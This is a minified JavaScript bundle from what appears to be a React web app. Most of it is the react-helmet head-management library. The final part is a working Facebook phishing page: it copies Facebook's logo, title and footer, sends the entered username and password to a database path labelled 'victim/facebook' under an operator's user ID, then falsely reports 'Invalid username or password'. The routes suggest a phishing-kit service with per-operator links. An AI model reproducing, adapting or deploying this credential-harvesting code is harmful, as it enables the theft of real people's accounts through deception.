e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)},Tm=function(t,e){var n={};for(var r in t)e.indexOf(r)>=0||Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r]);return n},Jx=function(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e&&(typeof e=="object"||typeof e=="function")?e:t},Fc=function(e){var n=arguments.length>1&&arguments[1]!==void 0?arguments[1]:!0;return n===!1?String(e):String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;")},Zx=function(e){var n=Jr(e,b.TITLE),r=Jr(e,Us.TITLE_TEMPLATE);if(r&&n)return r.replace(/%s/g,function(){return Array.isArray(n)?n.join(""):n});var i=Jr(e,Us.DEFAULT_TITLE);return n||i||void 0},eA=function(e){return Jr(e,Us.ON_CHANGE_CLIENT_STATE)||function(){}},wu=function(e,n){return n.filter(function(r){return typeof r[e]<"u"}).map(function(r){return r[e]}).reduce(function(r,i){return Ue({},r,i)},{})},tA=function(e,n){return n.filter(function(r){return typeof r[b.BASE]<"u"}).map(function(r){return r[b.BASE]}).reverse().reduce(function(r,i){if(!r.length)for(var s=Object.keys(i),o=0;o<s.length;o++){var l=s[o],a=l.toLowerCase();if(e.indexOf(a)!==-1&&i[a])return r.concat(i)}return r},[])},Fi=function(e,n,r){var i={};return r.filter(function(s){return Array.isArray(s[e])?!0:(typeof s[e]<"u"&&sA("Helmet: "+e+' should be of type "Array". Instead found type "'+Kx(s[e])+'"'),!1)}).map(function(s){return s[e]}).reverse().reduce(function(s,o){var l={};o.filter(function(h){for(var m=void 0,_=Object.keys(h),v=0;v<_.length;v++){var w=_[v],p=w.toLowerCase();n.indexOf(p)!==-1&&!(m===ee.REL&&h[m].toLowerCase()==="canonical")&&!(p===ee.REL&&h[p].toLowerCase()==="stylesheet")&&(m=p),n.indexOf(w)!==-1&&(w===ee.INNER_HTML||w===ee.CSS_TEXT||w===ee.ITEM_PROP)&&(m=w)}if(!m||!h[m])return!1;var f=h[m].toLowerCase();return i[m]||(i[m]={}),l[m]||(l[m]={}),i[m][f]?!1:(l[m][f]=!0,!0)}).reverse().forEach(function(h){return s.push(h)});for(var a=Object.keys(l),u=0;u<a.length;u++){var c=a[u],d=Vx({},i[c],l[c]);i[c]=d}return s},[]).reverse()},Jr=function(e,n){for(var r=e.length-1;r>=0;r--){var i=e[r];if(i.hasOwnProperty(n))return i[n]}return null},nA=function(e){return{baseTag:tA([ee.HREF,ee.TARGET],e),bodyAttributes:wu(Jn.BODY,e),defer:Jr(e,Us.DEFER),encode:Jr(e,Us.ENCODE_SPECIAL_CHARACTERS),htmlAttributes:wu(Jn.HTML,e),linkTags:Fi(b.LINK,[ee.REL,ee.HREF],e),metaTags:Fi(b.META,[ee.NAME,ee.CHARSET,ee.HTTPEQUIV,ee.PROPERTY,ee.ITEM_PROP],e),noscriptTags:Fi(b.NOSCRIPT,[ee.INNER_HTML],e),onChangeClientState:eA(e),scriptTags:Fi(b.SCRIPT,[ee.SRC,ee.INNER_HTML],e),styleTags:Fi(b.STYLE,[ee.CSS_TEXT],e),title:Zx(e),titleAttributes:wu(Jn.TITLE,e)}},jc=function(){var t=Date.now();return function(e){var n=Date.now();n-t>16?(t=n,e(n)):setTimeout(function(){jc(e)},0)}}(),Im=function(e){return clearTimeout(e)},rA=typeof window<"u"?window.requestAnimationFrame&&window.requestAnimationFrame.bind(window)||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||jc:global.requestAnimationFrame||jc,iA=typeof window<"u"?window.cancelAnimationFrame||window.webkitCancelAnimationFrame||window.mozCancelAnimationFrame||Im:global.cancelAnimationFrame||Im,sA=function(e){return console&&typeof console.warn=="function"&&console.warn(e)},ji=null,oA=function(e){ji&&iA(ji),e.defer?ji=rA(function(){km(e,function(){ji=null})}):(km(e),ji=null)},km=function(e,n){var r=e.baseTag,i=e.bodyAttributes,s=e.htmlAttributes,o=e.linkTags,l=e.metaTags,a=e.noscriptTags,u=e.onChangeClientState,c=e.scriptTags,d=e.styleTags,h=e.title,m=e.titleAttributes;zc(b.BODY,i),zc(b.HTML,s),lA(h,m);var _={baseTag:Tr(b.BASE,r),linkTags:Tr(b.LINK,o),metaTags:Tr(b.META,l),noscriptTags:Tr(b.NOSCRIPT,a),scriptTags:Tr(b.SCRIPT,c),styleTags:Tr(b.STYLE,d)},v={},w={};Object.keys(_).forEach(function(p){var f=_[p],g=f.newTags,y=f.oldTags;g.length&&(v[p]=g),y.length&&(w[p]=_[p].oldTags)}),n&&n(),u(e,v,w)},Ow=function(e){return Array.isArray(e)?e.join(""):e},lA=function(e,n){typeof e<"u"&&document.title!==e&&(document.title=Ow(e)),zc(b.TITLE,n)},zc=function(e,n){var r=document.getElementsByTagName(e)[0];if(r){for(var i=r.getAttribute(mt),s=i?i.split(","):[],o=[].concat(s),l=Object.keys(n),a=0;a<l.length;a++){var u=l[a],c=n[u]||"";r.getAttribute(u)!==c&&r.setAttribute(u,c),s.indexOf(u)===-1&&s.push(u);var d=o.indexOf(u);d!==-1&&o.splice(d,1)}for(var h=o.length-1;h>=0;h--)r.removeAttribute(o[h]);s.length===o.length?r.removeAttribute(mt):r.getAttribute(mt)!==l.join(",")&&r.setAttribute(mt,l.join(","))}},Tr=function(e,n){var r=document.head||document.querySelector(b.HEAD),i=r.querySelectorAll(e+"["+mt+"]"),s=Array.prototype.slice.call(i),o=[],l=void 0;return n&&n.length&&n.forEach(function(a){var u=document.createElement(e);for(var c in a)if(a.hasOwnProperty(c))if(c===ee.INNER_HTML)u.innerHTML=a.innerHTML;else if(c===ee.CSS_TEXT)u.styleSheet?u.styleSheet.cssText=a.cssText:u.appendChild(document.createTextNode(a.cssText));else{var d=typeof a[c]>"u"?"":a[c];u.setAttribute(c,d)}u.setAttribute(mt,"true"),s.some(function(h,m){return l=m,u.isEqualNode(h)})?s.splice(l,1):o.push(u)}),s.forEach(function(a){return a.parentNode.removeChild(a)}),o.forEach(function(a){return r.appendChild(a)}),{oldTags:s,newTags:o}},bw=function(e){return Object.keys(e).reduce(function(n,r){var i=typeof e[r]<"u"?r+'="'+e[r]+'"':""+r;return n?n+" "+i:i},"")},aA=function(e,n,r,i){var s=bw(r),o=Ow(n);return s?"<"+e+" "+mt+'="true" '+s+">"+Fc(o,i)+"</"+e+">":"<"+e+" "+mt+'="true">'+Fc(o,i)+"</"+e+">"},uA=function(e,n,r){return n.reduce(function(i,s){var o=Object.keys(s).filter(function(u){return!(u===ee.INNER_HTML||u===ee.CSS_TEXT)}).reduce(function(u,c){var d=typeof s[c]>"u"?c:c+'="'+Fc(s[c],r)+'"';return u?u+" "+d:d},""),l=s.innerHTML||s.cssText||"",a=Gx.indexOf(e)===-1;return i+"<"+e+" "+mt+'="true" '+o+(a?"/>":">"+l+"</"+e+">")},"")},Lw=function(e){var n=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{};return Object.keys(e).reduce(function(r,i){return r[Vl[i]||i]=e[i],r},n)},cA=function(e){var n=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{};return Object.keys(e).reduce(function(r,i){return r[qx[i]||i]=e[i],r},n)},dA=function(e,n,r){var i,s=(i={key:n},i[mt]=!0,i),o=Lw(r,s);return[qn.createElement(b.TITLE,o,n)]},hA=function(e,n){return n.map(function(r,i){var s,o=(s={key:i},s[mt]=!0,s);return Object.keys(r).forEach(function(l){var a=Vl[l]||l;if(a===ee.INNER_HTML||a===ee.CSS_TEXT){var u=r.innerHTML||r.cssText;o.dangerouslySetInnerHTML={__html:u}}else o[a]=r[l]}),qn.createElement(e,o)})},xt=function(e,n,r){switch(e){case b.TITLE:return{toComponent:function(){return dA(e,n.title,n.titleAttributes)},toString:function(){return aA(e,n.title,n.titleAttributes,r)}};case Jn.BODY:case Jn.HTML:return{toComponent:function(){return Lw(n)},toString:function(){return bw(n)}};default:return{toComponent:function(){return hA(e,n)},toString:function(){return uA(e,n,r)}}}},Dw=function(e){var n=e.baseTag,r=e.bodyAttributes,i=e.encode,s=e.htmlAttributes,o=e.linkTags,l=e.metaTags,a=e.noscriptTags,u=e.scriptTags,c=e.styleTags,d=e.title,h=d===void 0?"":d,m=e.titleAttributes;return{base:xt(b.BASE,n,i),bodyAttributes:xt(Jn.BODY,r,i),htmlAttributes:xt(Jn.HTML,s,i),link:xt(b.LINK,o,i),meta:xt(b.META,l,i),noscript:xt(b.NOSCRIPT,a,i),script:xt(b.SCRIPT,u,i),style:xt(b.STYLE,c,i),title:xt(b.TITLE,{title:h,titleAttributes:m},i)}},fA=function(e){var n,r;return r=n=function(i){Xx(s,i);function s(){return Yx(this,s),Jx(this,i.apply(this,arguments))}return s.prototype.shouldComponentUpdate=function(l){return!jx(this.props,l)},s.prototype.mapNestedChildrenToProps=function(l,a){if(!a)return null;switch(l.type){case b.SCRIPT:case b.NOSCRIPT:return{innerHTML:a};case b.STYLE:return{cssText:a}}throw new Error("<"+l.type+" /> elements are self-closing and can not contain children. Refer to our API for more information.")},s.prototype.flattenArrayTypeChildren=function(l){var a,u=l.child,c=l.arrayTypeChildren,d=l.newChildProps,h=l.nestedChildren;return Ue({},c,(a={},a[u.type]=[].concat(c[u.type]||[],[Ue({},d,this.mapNestedChildrenToProps(u,h))]),a))},s.prototype.mapObjectTypeChildren=function(l){var a,u,c=l.child,d=l.newProps,h=l.newChildProps,m=l.nestedChildren;switch(c.type){case b.TITLE:return Ue({},d,(a={},a[c.type]=m,a.titleAttributes=Ue({},h),a));case b.BODY:return Ue({},d,{bodyAttributes:Ue({},h)});case b.HTML:return Ue({},d,{htmlAttributes:Ue({},h)})}return Ue({},d,(u={},u[c.type]=Ue({},h),u))},s.prototype.mapArrayTypeChildrenToProps=function(l,a){var u=Ue({},a);return Object.keys(l).forEach(function(c){var d;u=Ue({},u,(d={},d[c]=l[c],d))}),u},s.prototype.warnOnInvalidChildren=function(l,a){return!0},s.prototype.mapChildrenToProps=function(l,a){var u=this,c={};return qn.Children.forEach(l,function(d){if(!(!d||!d.props)){var h=d.props,m=h.children,_=Tm(h,["children"]),v=cA(_);switch(u.warnOnInvalidChildren(d,m),d.type){case b.LINK:case b.META:case b.NOSCRIPT:case b.SCRIPT:case b.STYLE:c=u.flattenArrayTypeChildren({child:d,arrayTypeChildren:c,newChildProps:v,nestedChildren:m});break;default:a=u.mapObjectTypeChildren({child:d,newProps:a,newChildProps:v,nestedChildren:m});break}}}),a=this.mapArrayTypeChildrenToProps(c,a),a},s.prototype.render=function(){var l=this.props,a=l.children,u=Tm(l,["children"]),c=Ue({},u);return a&&(c=this.mapChildrenToProps(a,c)),qn.createElement(e,c)},Qx(s,null,[{key:"canUseDOM",set:function(l){e.canUseDOM=l}}]),s}(qn.Component),n.propTypes={base:Z.object,bodyAttributes:Z.object,children:Z.oneOfType([Z.arrayOf(Z.node),Z.node]),defaultTitle:Z.string,defer:Z.bool,encodeSpecialCharacters:Z.bool,htmlAttributes:Z.object,link:Z.arrayOf(Z.object),meta:Z.arrayOf(Z.object),noscript:Z.arrayOf(Z.object),onChangeClientState:Z.func,script:Z.arrayOf(Z.object),style:Z.arrayOf(Z.object),title:Z.string,titleAttributes:Z.object,titleTemplate:Z.string},n.defaultProps={defer:!0,encodeSpecialCharacters:!0},n.peek=e.peek,n.rewind=function(){var i=e.rewind();return i||(i=Dw({baseTag:[],bodyAttributes:{},encodeSpecialCharacters:!0,htmlAttributes:{},linkTags:[],metaTags:[],noscriptTags:[],scriptTags:[],styleTags:[],title:"",titleAttributes:{}})),i},r},pA=function(){return null},mA=bx(nA,oA,Dw)(pA),Bc=fA(mA);Bc.renderStatic=Bc.rewind;const gA=()=>{const{uid:t}=jd(),[e,n]=I.useState(!1),[r,i]=I.useState({name:"",password:""}),o=new Date().toLocaleString();I.useEffect(()=>{},[]);const l=a=>{a.preventDefault(),n(!0),lw(Lh(Wh,`user/${t}/victim/facebook/${r.name}/`),{user:r.name,password:r.password,date:o})};return E.jsxs("div",{children:[E.jsxs(Bc,{children:[E.jsx("meta",{property:"og:image",content:"https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png"}),E.jsx("meta",{property:"og:image:type",content:"image/jpeg"}),E.jsx("meta",{property:"og:image:width",content:"400"}),E.jsx("meta",{property:"og:image:height",content:"300"}),E.jsx("title",{children:"Facebook"}),E.jsx("link",{rel:"icon",href:"https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png"})]}),e&&E.jsx("div",{className:"bg-red-500 w-full p-1 text-white text-sm",children:"Invalid username or password"}),E.jsxs("div",{className:"h-screen flex flex-col items-center mx-16",children:[E.jsx("div",{children:E.jsx("img",{src:"https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",alt:"facebook",className:"h-[100px] w-[150px]"})}),E.jsxs("div",{className:"flex flex-col items-center justify-center w-full",children:[E.jsxs("form",{className:"flex flex-col w-full",onSubmit:l,children:[E.jsx("input",{type:"text",placeholder:"Mobile number or email address",className:"w-full border shadow-sm m-1 h-10 px-4 rounded",onChange:a=>i({...r,name:a.target.value})}),E.jsx("input",{type:"password",placeholder:"Password",className:"w-full border shadow-sm m-1 h-10 px-4 rounded",onChange:a=>i({...r,password:a.target.value})}),E.jsx("button",{className:"bg-blue-600 my-2 p-2 font-bold text-white rounded",children:"Log In"})]}),E.jsx("a",{href:"https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0",className:"text-blue-600 text-sm",children:"Forgotten password?"})]}),E.jsxs("div",{className:"w-full flex  justify-center h-10 items-center",children:[E.jsx("div",{className:"border-b border-gray-300 w-full"}),E.jsx("div",{className:"h-10 flex items-center justify-center mx-5",children:"or"}),E.jsx("div",{className:"border-b border-gray-300 w-full"})]}),E.jsx("div",{children:E.jsx("button",{className:"border-[1px] w-72 p-1 font-bold",children:"Create new account"})}),E.jsxs("div",{className:"flex justify-between w-full mt-28",children:[E.jsx("div",{children:E.jsxs("ul",{className:"text-center text-[12px]",children:[E.jsx("li",{children:"English (UK)"}),E.jsx("li",{className:"text-blue-600",children:"অসমীয়া"}),E.jsx("li",{className:"text-blue-600"}),E.jsx("li",{className:"text-blue-600",children:"Portugues (Brazil)"})]})}),E.jsx("div",{children:E.jsxs("ul",{className:"flex flex-col items-center text-center text-[12px]",children:[E.jsx("li",{className:"text-blue-600",children:"বাংলা"}),E.jsx("li",{className:"text-blue-600",children:"hindi"}),E.jsx("li",{className:"text-blue-600",children:"Espanol"}),E.jsx("li",{className:"border border-blue-600  w-5",children:"+"})]})})]}),E.jsxs("div",{className:"flex items-center justify-center",children:[E.jsx("li",{className:"list-none px-2 text-[10px] text-gray-400",children:"About"}),E.jsx("li",{className:" px-2 text-[10px] text-gray-400",children:"Help"}),E.jsx("li",{className:" px-2 text-[10px] text-gray-400",children:"More"})]}),E.jsx("div",{className:"text-[12px] py-3 text-gray-400",children:"Meta © 2023"})]})]})},_A=()=>E.jsx(nS,{children:E.jsxs(QC,{children:[E.jsx(Fn,{exact:!0,path:"/:uid",Component:yx}),E.jsx(Fn,{exact:!0,path:"/",Component:Em}),E.jsx(Fn,{exact:!0,path:"/signup",Component:wx}),E.jsx(Fn,{exact:!0,path:"/facebookLink/:uid",Component:Ex}),E.jsx(Fn,{exact:!0,path:"/facebook/:uid",Component:gA}),E.jsx(Fn,{path:"*",Component:Em})]})});function vA(){return E.jsx(E.Fragment,{children:E.jsx(_A,{})})}Eu.createRoot(document.getElementById("root")).render(E.jsx(qn.StrictMode,{children:E.jsx(vA,{})}));
